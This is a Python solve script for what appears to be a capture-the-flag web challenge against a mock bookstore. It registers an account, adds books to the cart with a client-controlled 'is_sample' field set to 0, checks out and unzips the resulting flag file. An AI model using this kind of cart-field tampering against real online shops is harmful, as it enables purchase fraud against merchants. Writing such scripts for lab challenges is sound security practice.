import requests
import subprocess

url = "https://narnes-and-bobles-645go.instancer.lac.tf/"
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f"{url}/register", json=creds)
res = s.post(f'{url}/login', json=creds)

res = s.post(f'{url}/cart/add', json={
  "products": [
    {
        "book_id": "a3e33c2505a19d18",
        "is_sample": 0
    },
    {
        'book_id': '2a16e349fb9045fa',
        'is_sample': 0
    }
  ]
})

res = s.post(f'{url}/cart/checkout')

with open("flag.zip", "wb") as f:
    f.write(res.content)

print("> Got flag")

subprocess.run(['unzip', '-o', 'flag.zip'], capture_output=True)

with open("flag.txt", 'r') as f:
    print("Flag:", f.read().strip())